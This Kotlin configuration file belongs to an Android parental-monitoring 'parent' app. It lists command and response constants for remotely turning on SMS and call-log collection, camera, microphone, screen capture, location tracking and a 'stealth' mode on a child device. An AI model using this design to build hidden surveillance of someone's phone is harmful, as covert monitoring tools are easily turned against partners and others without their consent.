package com.soumo.parentandroid

object AppConf {
    // 🔹 Backend API (match Electron app)
    // Replace with your own hosted email/OTP service endpoint
    const val RENDER_API_URL = "YOUR_EMAIL_SERVICE_URL"

    // 🔹 Firebase
    // Realtime Database root URL (e.g., https://<project-id>-default-rtdb.<region>.firebasedatabase.app/)
    const val FIREBASE_DB_URL = "YOUR_RTDATABASE_URL"
    const val FIREBASE_OTP_PATH = "otp"
    const val FIREBASE_CALLS_PATH = "calls"

    // 🔹 WebRTC (align with common Chromium defaults used by Electron)
    val STUN_SERVERS = listOf(
        "stun:stun.l.google.com:19302",
        "stun:stun1.l.google.com:19302",
        "stun:stun2.l.google.com:19302",
        "stun:stun3.l.google.com:19302",
        "stun:stun4.l.google.com:19302"
    )

    // 🔹 Commands
    const val CMD_CHECK_PERMISSIONS = "CHECK_PERMISSIONS"
    const val CMD_REQUEST_ALL_PERMISSIONS = "REQUEST_ALL_PERMISSIONS"
    const val CMD_SHOW_PERMISSION_DIALOG = "SHOW_PERMISSION_DIALOG" // usage: SHOW_PERMISSION_DIALOG:<Feature>

    const val CMD_SMS_ON = "SMS_ON"
    const val CMD_SMS_OFF = "SMS_OFF"

    const val CMD_CALLLOG_ON = "CALLLOG_ON"
    const val CMD_CALLLOG_OFF = "CALLLOG_OFF"

    const val CMD_CAMERA_ON = "CAMERA_ON"
    const val CMD_CAMERA_OFF = "CAMERA_OFF"
    const val CMD_CAMERA_SWITCH = "CAMERA_SWITCH"

    const val CMD_MIC_ON = "MIC_ON"
    const val CMD_MIC_OFF = "MIC_OFF"

    const val CMD_SCREEN_ON = "SCREEN_ON"
    const val CMD_SCREEN_OFF = "SCREEN_OFF"

    const val CMD_LOCATION_ON = "LOCATE_CHILD"
    const val CMD_LOCATION_OFF = "LOCATE_CHILD_STOP"

    const val CMD_STEALTH_ON = "STEALTH_ON"
    const val CMD_STEALTH_OFF = "STEALTH_OFF"

    // 🔹 Responses from Child
    const val RSP_ALL_PERMISSIONS_REQUESTED = "ALL_PERMISSIONS_REQUESTED"
    const val RSP_PERMISSION_DIALOG_SHOWN = "PERMISSION_DIALOG_SHOWN"
    const val RSP_PERMISSION_STATUS_PREFIX = "PERMISSION_STATUS:" // e.g., PERMISSION_STATUS:granted/denied

    const val RSP_SMS_STARTED = "SMS_STARTED"
    const val RSP_SMS_STOPPED = "SMS_STOPPED"
    const val RSP_SMS_ERROR_PREFIX = "SMS_ERROR:"
    const val RSP_SMS_PERMISSION_REQUESTED = "SMS_PERMISSION_REQUESTED"

    const val RSP_CALLLOG_STARTED = "CALLLOG_STARTED"
    const val RSP_CALLLOG_STOPPED = "CALLLOG_STOPPED"
    const val RSP_CALLLOG_ERROR_PREFIX = "CALLLOG_ERROR:"
    const val RSP_CALLLOG_PERMISSION_REQUESTED = "CALLLOG_PERMISSION_REQUESTED"

    const val RSP_CAMERA_STARTED = "CAMERA_STARTED"
    const val RSP_CAMERA_STOPPED = "CAMERA_STOPPED"
    const val RSP_CAMERA_SWITCHED = "CAMERA_SWITCHED"
    const val RSP_CAMERA_ERROR_PREFIX = "CAMERA_ERROR:"
    const val RSP_CAMERA_PERMISSION_REQUESTED = "CAMERA_PERMISSION_REQUESTED"

    const val RSP_MIC_STARTED = "MIC_STARTED"
    const val RSP_MIC_STOPPED = "MIC_STOPPED"
    const val RSP_MIC_ERROR_PREFIX = "MIC_ERROR:"
    const val RSP_MIC_PERMISSION_REQUESTED = "MIC_PERMISSION_REQUESTED"

    const val RSP_SCREEN_STOPPED = "SCREEN_STOPPED"
    const val RSP_SCREEN_ERROR_PREFIX = "SCREEN_ERROR:"
    const val RSP_SCREEN_CAPTURE_ERROR_PREFIX = "SCREEN_CAPTURE_ERROR:"
    const val RSP_SCREEN_PERMISSION_REQUESTED = "SCREEN_PERMISSION_REQUESTED"

    const val RSP_LOCATION_STARTED = "LOCATION_STARTED"
    const val RSP_LOCATION_STOPPED = "LOCATION_STOPPED"
    const val RSP_LOCATION_ERROR_PREFIX = "LOCATION_ERROR:"
    const val RSP_LOCATION_PERMISSION_REQUESTED = "LOCATION_PERMISSION_REQUESTED"

    const val RSP_STEALTH_ON_ACK = "STEALTH_ON_ACK"
    const val RSP_STEALTH_OFF_ACK = "STEALTH_OFF_ACK"

    const val RSP_UNKNOWN_COMMAND_PREFIX = "UNKNOWN_COMMAND:"
    const val RSP_COMMAND_ERROR_PREFIX = "COMMAND_ERROR:"
    const val RSP_PING_CHILD = "PING_CHILD"
    const val RSP_PONG_CHILD = "PONG_CHILD"

    // JSON message types
    const val TYPE_LOCATION_UPDATE = "LOCATION_UPDATE"

}
